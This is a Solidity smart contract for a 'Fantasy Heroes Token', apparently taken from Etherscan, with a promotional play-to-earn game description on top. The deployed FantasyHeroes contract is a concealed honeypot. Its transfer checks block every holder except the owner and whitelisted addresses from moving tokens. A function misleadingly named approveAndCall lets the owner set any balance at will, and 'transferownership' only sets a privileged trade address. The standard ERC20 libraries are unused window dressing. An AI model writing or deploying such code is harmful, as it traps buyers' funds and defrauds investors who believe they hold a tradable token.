/**
 *Submitted for verification at Etherscan.io on 2022-06-21
*/

/*

"Fantasy Heroes Token"

Website:   https://www.fantasy-heroes.com
Telegram: https://t.me/fantasyheroesofficial
Twitter:     https://www.twitter.com/fantasyheroes_
Medium:   https://www.medium.com/@fantasyheroes
Github:     https://www.github.com/fantasyheroes
Email:       [email protected]

Fantasy Heroes is an innovation profit-sharing heroes which generates passive income for all Token holders 
within the platform. Fantasy Heroes let's you dive into a new real of live dealer Role-Playing-Game (RPG) 
with a fun, fast, provably fair and immersive gaming experience.  Fantasy Heroes was created with a powerful 
community. Not only we are focusing on playing game to reaching the final boss, while leveling up all of your 
heroes to the limit but also the thecnology of the Token with our launched play to earn RPG game. It is an 
interactive, Role-Playing-Game type which is addictive. The live dealer feature is unique to Fantasy heroes and 
created a new standard for online gaming platform as a whole. It will created RPG atmosphere for players While 
blockchain technology will provide top-notch safety and transparency protocols.
Fantasy Heroes is a P2E (Play-to-Earn) game platform built on the ETHEREUM network, connect with MetaMask 
to play.  Players can enjoy many types of games for entertainment in their spare time and, more importantly, be able 
to earn extra income through the Fantasy Heroes game ecosystem. Using the NFT Training feature, players will
earn passive income from their NFT without having to sell them.

About Game
Fantasy Heroes is a new RPG game. In less than a year, Fantasy Heroes became a cult RPG among the fans of 
this genre and even followed in the footsteps of a legendary role-playing game, being one of the best Diablo-like 
titles. The game world is full of spectacular adventures and customizable characters.

Character Selection
There are six playable characters in Fantasy Heroes, and each of them comes which their own unique characteristics 
and combat effects. Unlike other popular action games, Fantasy Heroes allows you to choose not one, but three 
characters to form a raid party. Fantasy Heroes has these classes to offer: 
• Knight – DPS character with strong melee damage. 
• Elf – an archer who is able to support their teammates from a long range. 
• Dwarf – a support hero with skills to fight at a distance. 
• Abyss Catcher – a mage with strong arcane damage. 
• Sorcerer – a mage who can heal friendly heroes. 
• Priest – a mage with a set of auxiliary spells for support. 
During the adventures in Fantasy Heroes, the team of heroes carry out raids on beautiful and well-drawn locations, 
where they fight both ordinary mobs and unique bosses of this action game. 
The heroes will receive experience points and gold for killing monsters, and those rewards can be used to upgrade 
their skills. Action RPG heroes will kill ordinary mobs on their own, you just need to lead them to the right spot, but 
it’s not the same with boss battles, where you have to use various super-blows and power-ups to secure a win. 

Leveling up and Strengthening a team
As in any RPG game, you have two goals: to reach the final boss, while leveling up all of your heroes to the limit. In 
the vastness of the game world, you can find chests with hidden valuables including equipment, weapons, unique 
potions and magic arrows. With the help of found loot you can significantly strengthen each hero, as well as improve 
the synergy of the whole team. If one of your character dies (and this is a possibility), you can always use a respawn 
point to resurrect them. 

Game features and Restrictions
Fantasy Heroes is an action game with RPG elements, which does not require an active internet connection. It features 
unique graphics with colorful locations and dynamic battles in the best traditions of the action genre. The RPG game also 
features high-quality musical score, which makes the gameplay even more exciting and allows you to fully immerse in the 
world of remarkable adventures and action battles. This RPG does not have any built-in restrictions on attempts, limits in 
energy and other obstacles designed to prevent players from leveling up their characters. The RPG features more than 
1000 different items of combat equipment, which allows to create endless unique builds. You can also choose unique power 
buffs and upgrade skills to make the gameplay of this RPG more dynamic, while defeating bosses and fighting for the most 
valuable rewards. You will be pleasantly surprised with the abundance of fantasy elements in Fantasy Heroes, including such 
unique NPC characters for action fights as dragons, golems, gremlins, etc. 

Premium Content 
This action RPG also features paid content, so that players can immediately purchase everything they need for the most dynamic 
action game. Thankfully, it is not necessary to buy starter packs, because every player can easily level up any character just by 
playing this game for a couple days. Right after creating a team and choosing your heroes, you will need to complete few tutorial 
levels in this fantasy game, where you will learn how to manage your army, switch between characters, use super-blows, kill 
monsters and master every aspect of the RPG. Fantasy Heroes is an exciting action game with RPG elements, where you can 
dive in spectacular battles and raids in the amazing world of arcane magic.
*/
pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}

contract FantasyHeroes {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
       if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}